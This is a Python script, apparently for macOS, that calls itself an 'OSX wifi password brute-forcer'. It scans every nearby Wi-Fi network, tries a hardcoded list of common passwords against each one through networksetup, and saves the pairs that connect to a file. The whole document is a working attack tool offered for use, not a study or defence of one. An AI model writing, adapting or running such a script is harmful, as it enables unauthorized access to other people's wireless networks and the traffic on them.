import os
import subprocess
import sys
import time
import itertools

# Find Network Interface (en0 for me): $ networksetup -listnetworkserviceorder 
# Scan for wifi networks (and collect ssids): $ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
# Connect to Wifi SSID: $ networksetup -setairportnetwork en0 SSID pw

# OPTIONAL: Load passwords from a file
# OPTIONAL: password_file = "passwords.txt"  # Path to your password file

# OPTIONAL: with open(password_file, "r") as file:
# OPTIONAL: passwords = [line.strip() for line in file if line.strip()]  # Read and clean up lines


# Function to print a rainbow ASCII banner
def print_rainbow_banner():
    colors = [
        "\033[1;31m",  # Red
        "\033[1;33m",  # Yellow
        "\033[1;32m",  # Green
        "\033[1;36m",  # Cyan
        "\033[1;34m",  # Blue
        "\033[1;35m",  # Magenta
    ]
    
    banner = [
        "▗▖ ▗▖▗▄▄▄▖▗▄▄▄▖▗▄▄▄▖    ▗▄▄▖ ▗▄▄▄▖",
        "▐▌ ▐▌  █  ▐▌     █      ▐▌ ▐▌▐▌   ",
        "▐▌ ▐▌  █  ▐▛▀▀▘  █      ▐▛▀▚▖▐▛▀▀▘",
        "▐▙█▟▌▗▄█▄▖▐▌   ▗▄█▄▖    ▐▙▄▞▘▐▌   ",
        " ",
        "OSX wifi password brute-forcer",
        " "
                                 
    ]
    
    # Print each line with a rainbow gradient
    for line in banner:
        colored_line = "".join(colors[i % len(colors)] + char for i, char in enumerate(line))
        print(colored_line + "\033[0m")  # Reset color after each line

# Call the function to print the rainbow banner
print_rainbow_banner()

# Store successful connections
successful_combinations = []

# Scan command, stripping all content instead of the SSIDS
scan = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | awk \'{print $1}\''

# Edit this! List of passwords to try (TODO: add variable masks for local phone numbers):
passwords = ['88888888', '12345678', '1234567890', '00000000', '123123123', 'bnm,/852', 'buzhidao']

# Store SSIDS
ssids = []

# Rotating cursor setup
cursor = itertools.cycle(["|", "/", "-", "\\"])

# Run the shell command and capture output
result = subprocess.run(["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | awk \'{print $1}\'"],  shell=True,capture_output=True, text=True)

# Get the stdout as a list of lines
lines = result.stdout.split("\n")

# Remove the first line (optional, if needed)
ssids = lines[1:]  

# Try each SSID with all passwords until one works
for ssid in ssids:
    ssid = ssid.strip()  # Clean up SSID
    if ssid:  # Ensure SSID is not empty
        for password in passwords:
            sys.stdout.write(f"\rTrying {ssid} with {password}... ")
            sys.stdout.flush()

            # Simulate loading animation (rotates 5 times while running command)
            for _ in range(5):
                sys.stdout.write(next(cursor))  
                sys.stdout.flush()
                time.sleep(0.2)  # Adjust speed if needed
                sys.stdout.write("\b")  # Move back one space to overwrite cursor
            command = ["networksetup", "-setairportnetwork", "en0", ssid, password]
            result = subprocess.run(command, capture_output=True, text=True)

         # Simulate loading animation (rotates 5 times while running command)
            for _ in range(5):
                sys.stdout.write(next(cursor))  
                sys.stdout.flush()
                time.sleep(0.2)  # Adjust speed if needed
                sys.stdout.write("\b")  # Move back one space to overwrite cursor
            
            # Check if the connection was successful
            verify_command = ["networksetup", "-getairportnetwork", "en0"]
            verify_result = subprocess.run(verify_command, capture_output=True, text=True)

            if ssid in verify_result.stdout:  # If connected, store the working pair
                print(f"✅ Connected to {ssid} with {password}")
                successful_combinations.append((ssid, password))
                break  # Stop trying passwords for this SSID
        else:
            print(f"❌ No password worked for {ssid}")

# Print the successful combinations
print("\n✅ Successful SSID-Password Pairs:")
for ssid, password in successful_combinations:
    print(f"- SSID: {ssid}, Password: {password}")

# Optional: Save to a file
with open("successful_combinations.txt", "w") as file:
    for ssid, password in successful_combinations:
        file.write(f"{ssid},{password}\n")

print("\nSaved successful combinations to successful_combinations.txt")